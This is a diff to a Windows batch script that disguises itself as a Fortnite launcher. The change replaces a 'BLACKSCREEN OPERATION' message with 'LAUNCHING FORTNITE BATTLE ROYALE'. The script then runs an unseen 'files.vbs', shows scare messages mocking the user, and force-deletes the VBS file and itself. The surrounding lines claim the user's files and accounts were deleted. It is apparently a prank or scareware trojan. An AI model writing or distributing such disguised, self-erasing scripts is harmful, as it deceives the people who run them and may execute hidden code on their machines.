@@ -36,10 +36,19 @@ echo All files and accounts succesfully deleted (including Google, Genially, Blo
 timeout /t 2 /nobreak >nul
 cls
 color a
-echo BLACKSCREEN OPERATION SUCCESFULLY COMPLETED
+echo LAUNCHING FORTNITE BATTLE ROYALE
 timeout /t 3 /nobreak >nul
 cd fortnite-files
 call "files.vbs"
-timeout /t 10 /nobreak >nul
-del /f files.vbs
+timeout /t 8 /nobreak >nul
+color c
+echo D A N G E R
+timeout /t 1 /nobreak >nul
+echo YOU DUMB!
+timeout /t 2 /nobreak >nul
+echo BE CAREFUL WITH WHAT YOU DO
+timeout /t 2 /nobreak >nul
+echo BLACKSCREEN OPERATION SUCCESFULLY COMPLETED
+timeout /t 3 /nobreak >nul
+del /f /fortnite-files/files.vbs
 del /f START.bat & exit
